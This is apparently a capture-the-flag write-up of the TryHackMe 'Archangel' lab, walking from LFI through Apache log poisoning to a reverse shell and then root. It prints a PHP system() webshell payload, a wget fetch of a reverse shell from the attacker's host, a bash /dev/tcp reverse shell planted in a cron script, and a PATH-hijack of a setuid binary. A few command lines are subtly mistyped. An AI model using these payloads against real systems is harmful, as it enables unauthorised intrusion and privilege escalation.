# Room: [Archangel](https://tryhackme.com/room/archangel)

## Overview
This write‑up covers the *Archangel* room on [TryHackMe](https://tryhackme.com), created by [Archangel](https://tryhackme.com/p/Archangel).

The objective of this room is to gain root access to the target machine; To achieve this, several techniques are required.    
In short, this box includes multiple classic attack vectors into a single challenge.

## Setup
- **Tools used:** nmap, gobuster, cyberchef, python3, netcat, wget, script, bash, php.
- **Techniques:** Log poisoning, Reverse shell payloads, PATH hijacking, Cron Job abuse.
- **Notes:** This room took me several days to complete, which is why some of the screenshots may show different IP addresses. It was a challenging experience, but working through each step helped me sharpen my skills and better understand the techniques involved.
---

## Method 

I began this room by performing an initial `nmap` port scan to enumerate the target. 
    
The command used was:

```bash
nmap -sC -sV <Target IP>
```

The port scan revealed two services running on the target server, `ssh` and `http`.

From the `nmap` output, I also noted the WaveFire hostname associated with the `http` service.

![Nmap image revealing the two services running and wavefire hostname](media/1.png)

Next, I opened the target IP in my browser, which led me to the previously enumerated WaveFire website, where I ended up obtaining my first flag.

![website, showing the flag as a different hostname as an email domain.](media/2.png)

To search for pages under development, I ran the following Gobuster command:

```bash
gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/big.txt

```
![gobuster results.](media/3.png)

Gobuster revealed four directories returning code 301: `/flags`, `/images`, `/layout`, and `/pages`.

There was nothing of importance inside`/images`,`/layout` and `/pages`.

The `/flags` directory only had a text document redirecting to [this link](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

![its a rickroll](media/4.png)

Since this was clearly a decoy, I pivoted to the hostname discovered in the previous step.

To resolve the target IP to the desired hostname, I added a new entry to the `/etc/hosts` file:

![etc file](media/5.png)

This immediately exposed the page under development, which contained the second flag.

![second flag...which's name is "flag 1"](media/6.png)

To move toward the next flag, it was necessary to identify another page on the target hostname. For that, I ran the following Gobuster command:

```bash
gobuster dir -u http://<Target VHost> -w /usr/share/wordlists/dirb/big.txt
```

Gobuster revealed a text document at `robots.txt` with a `200` response code.

![gobuster](media/7.png)

Adding `/robots.txt` to the hostname url led me to a page that hinted at the presence of a test php file named `test.php`.

![url with robots.txt](media/8.png)

Navigating to it, it was possible to find a simple interface containing only text and a button.

Upon clicking the button, the page's url, previously `http://<Target Domain>/test.php`, now, displayed `http://<Target Hostname>/test.php?view=/var/www/html/development_testing/mrrobot.php`

![control is an illusion](media/9.png)

This indicated that the application was attempting to read files from the server.

To test the extent of this functionality, I modified the URL to try accessing `/etc/passwd`:

```
http://<Target Hostname>/test.php?view=/etc/passwd
```

But I was not successful.

![sorry, that is not allowed](media/10.png)

At this point, it became clear that the page was calling another file and restricting direct access.

To bypass this, I leveraged PHP’s stream wrappers; By requesting the file through `php://filter` with base64 encoding, I could retrieve the raw source code instead of executing it.


```
http://<Target Domain>/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Which was a success.

![base64 source code](media/11.png)

Using CyberChef offline, I decoded the output to reveal the source code, along with another flag.

![test.php source code](media/12.png)

For easier analysis, I copied the plaintext source code into a local text file.

![source code plaintext](media/13.png)

From analyzing the `test.php` source code, I learned that the input was restricted:  
- The parameter had to include `view=/var/www/html/development_testing`.  
- Attempts to use `../..` were blocked.

To bypass this restriction, I used a double‑slash `..//..` to traverse directories. The modified URL was:

```
http://<Target Domain>/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd
```

This successfully returned the contents of `/etc/passwd`.

![passwd immage!](media/14.png)

At this stage, the vulnerability is confirmed: we can read arbitrary files on the server despite the restrictions.

The next logical step after confirming LFI was to escalate it into code execution, ultimately aiming for a shell.

To achieve this, I modified the `User-Agent` header of my request. This can be done with tools like BurpSuite, but I used the browser’s developer tools (Inspect → Network → Resend).

![That was a lot of instructions...here's the immage tho](media/15.png)

In the request editor, I replaced the `User-Agent` value with the following PHP payload:

```php
<?php system($_GET[´cmd´]);?>
```
After resending the request, the payload was successfully injected.

![thers it is](media/16.png)

With the PHP code now in place, I was able to run system commands directly through the webpage.

To trigger the payload, I included the Apache access log file via LFI:

```bash
http://<Target Domain>/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
```

Then I appended the cmd parameter to specify the command I wanted to run.

```bash
&cmd=ls -l
```

By loading the page and viewing its source, I could now see the output of the command executed on the server.

![thers it is](media/17.png)

To move from basic command execution to an interactive shell, I needed a PHP reverse shell script and a way to serve it to the target.

Fortunately, the `pentestmonkey PHP reverse shell` was already available on the attack machine in the `/usr/share/webshells/php` directory. I copied `php-reverse-shell.php` into a new directory I called `python_server`, updated it with my IP address and chosen listener port, and set the appropriate permissions.

I then started a simple Python HTTP server on port 5555 to host the file:

![all that is shown here](media/18.png)

With the server running, I used the vulnerable `cmd` parameter to instruct the target to download the reverse shell via `wget`:

```bash
http://<Target Domain>/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://IP:5555/shell.php
```

To confirm the file was successfully retrieved, I ran another `ls -l` command through the same method. The output showed that `shell.php` was now present on the target.

![shell on the website source code](media/19.png)

Next, I set up a Netcat listener on the same port I had configured in the reverse shell script:

![netcat -lvnp 4444](media/20.png)

Finally, I triggered the reverse shell by using the `cmd` parameter to execute it on the target:

```bash
http://<Target Domain>/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=php shell.php
```

The listener immediately received a connection, giving me interactive access to the server as the `www-data` user.

![listener getting connection](media/21.png)

To make the shell more stable, I upgraded it using: 
``` bash
/usr/bin/script -qc /bin/bash /dev/null
```

Once the shell was stabilized, I explored the filesystem and located the user flag in `/home/archangel`.

![f9inding the flag](media/22.png)

While exploring further, I attempted to access the secret directory but was denied permission. This directory was owned by the archangel user, suggesting it likely contained the next flag and would require privilege escalation to access.

![permisssion denied on seceret](media/23.png)

Investigating possible escalation paths, I checked `/etc/crontab` and discovered a script owned by `archangel` that was scheduled to run every minute.

![crontab](media/24.png)

Navigating to `/opt`, where the script was located, I found that it had world read, write, and execute permissions.

![ls -l of opt](media/25.png)

This presented a clear privilege escalation opportunity. Since the target machine did not have `vim` installed, I used `echo` to inject a reverse shell payload into the script:

```bash
bash -l >& /dev/tcp/<ATTACK MACHINE IP>/<PORT> 0>&1
```

![what i said above](media/26.png)

I then set up a new Netcat listener and waited for the cron job to execute the modified script.

Within a minute, the listener received a connection.

![listener recieving the connection](media/27.png)

As the `archangel` user, I now had permission to enter the `secret` directory.

Inside, I retrieved another user flag.

![ls -l on secret and cat the flag](media/28.png)

Alongside the flag, there was a file named `backup`.

Examining its permissions revealed that it was owned by `root` and had the setuid bit enabled, meaning it would execute with root privileges regardless of who ran it. Since it was also world‑executable, this made `backup` a very strong privilege escalation candidate.

Reading the file with `cat` produced gibberish, confirming it was a compiled binary rather than a script.

To investigate further, I used the `strings` command to extract human‑readable text from the binary:

![cat of backup](media/29.png)

![strings of backup](media/30.png)

Among the output, I found the following line:

```bash
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

To exploit this, I hijacked the `$PATH` variable so that the system would look in my current directory first when searching for executables.

```bash
export PATH $PWD:$PATH
```

![echo path and path hijacking](media/31.png)

I created a malicious script named cp that simply spawned a root shell:

![evil cp command](media/32.png)

I gave my `cp` script execute permissions and executed `backup`:

![chmod +x backup && ./backup](media/33.png)

This immediately dropped me into a root shell, enabling me to navigate to `/root` and retrieving the final flag.

![root flag](media/34.png)

---
